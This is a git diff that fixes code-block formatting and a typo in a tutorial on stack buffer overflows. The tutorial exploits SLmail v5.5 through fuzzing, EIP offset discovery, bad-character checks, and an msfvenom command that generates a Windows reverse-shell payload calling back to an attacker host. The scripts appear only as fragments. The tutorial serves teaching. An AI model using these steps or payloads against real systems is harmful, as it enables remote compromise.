@@ -114,7 +114,7 @@ The most common reason why buffer overflow attacks work is because applications 
 * realpath() - return absolute (full) path
 
 
-## Exemple
+## Example
 1. It is expected to be stored 8 characters.
 [attack1]
 
@@ -141,7 +141,7 @@ In order to show a practicle buffer overflow example, SLmail v5.5 will be used. 
 1. Crash the application by sending 'A's.
 
 fuzzing.py
-´´´
+```python
 #!/usr/bin/python
 import time, struct, sys
 import socket as so
@@ -187,21 +187,21 @@ for string in buff:
      except: 
         print "[+] Connection failed. Make sure IP/port are correct, or check debugger for SLmail crash."
         sys.exit()
-´´´
+```
 
 Then, calculate how many bytes are needed to make the software crash (NUM_BYTES):
 []
 
 2. Identify with 4 bytes overwrite EIP
 Create a unique pattern using pattner_create.rb:
-´´´
+```python
 pattern_create.rb -l NUM_BYTES
-´´´
+```
 []
 
 
 indentify_eip.py
-```
+```python
 #!/usr/bin/python
 import time, struct, sys
 import socket as so
@@ -232,15 +232,15 @@ except:
 
 
 Calculate the exact bytes which overwrite EIP using pattern_offset.rb:
-´´´
+```
 pattern_offset.rb -q EIP_VALUE
-´´´
+```
 []
 
 
 3. Check if we have full control of the EIP by sending 'A'*offset + 'B'*4 + 'C's
 check_eip.py
-```
+```python
 #!/usr/bin/python
 
 import time, struct, sys
@@ -275,7 +275,7 @@ except:
 
 5. Discover bad characters by looking which of them are not correctly printed (Remember to include always \x00)
 badchars.py
-```
+```python
 #!/usr/bin/python
 
 import time, struct, sys
@@ -348,7 +348,7 @@ Select any pointer and copy its address
 msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f py -b "BADCHARS"
 
 8. Exploit
-```
+```python
 #!/usr/bin/python
 # coding=utf-8
 
